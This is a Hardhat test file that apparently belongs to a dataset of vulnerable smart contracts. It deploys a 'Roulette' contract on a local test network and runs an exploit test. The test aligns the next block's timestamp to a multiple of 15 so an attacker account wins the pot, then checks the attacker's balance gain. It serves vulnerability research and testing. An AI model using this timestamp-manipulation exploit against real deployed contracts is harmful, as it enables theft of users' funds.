const {
  loadFixture,
  time,
} = require("@nomicfoundation/hardhat-network-helpers");
const { expect } = require("chai");
const path = require("path");
const fs = require("fs");

describe("attack time_manipulation/roulette.sol", function () {
  let owner, sig1, amount;
  async function deployContracts() {
    [owner, sig1] = await ethers.getSigners();

    amount = ethers.parseEther("10");
    const codePath = path.join(
      __dirname,
      "../../artifacts/contracts/dataset/time_manipulation/roulette.sol/Roulette.json",
    );
    const json = JSON.parse(fs.readFileSync(codePath));
    const Roulette = await ethers.getContractFactory(json.abi, json.bytecode);
    const victim = await Roulette.connect(owner).deploy({ value: amount });

    return { victim };
  }

  it("sanity check: time_manipulation/roulette.sol", async function () {
    const { victim } = await loadFixture(deployContracts);
    await expect(
      owner.sendTransaction({
        to: victim.target,
        value: amount,
      }),
    ).to.not.be.reverted;
    expect(await ethers.provider.getBalance(victim.target)).to.be.gt(0);
  });

  it("exploit time manipulation vulnerability", async function () {
    const { victim } = await loadFixture(deployContracts);
    const victimBalanceBefore = await ethers.provider.getBalance(victim.target);
    expect(victimBalanceBefore).to.equal(amount);

    const sig1BalanceBefore = await ethers.provider.getBalance(sig1.address);

    const blockBefore = await ethers.provider.getBlock();
    const timestampBefore = blockBefore.timestamp;

    const next = timestampBefore + 15 - (timestampBefore % 15);

    await time.setNextBlockTimestamp(next);

    const tx = await sig1.sendTransaction({
      to: victim.target,
      value: amount,
    });

    const receipt = await tx.wait();

    const sig1Balance = await ethers.provider.getBalance(sig1.address);
    expect(sig1Balance).to.equal(
      sig1BalanceBefore - receipt.gasUsed * receipt.gasPrice + amount,
    );
  });
});
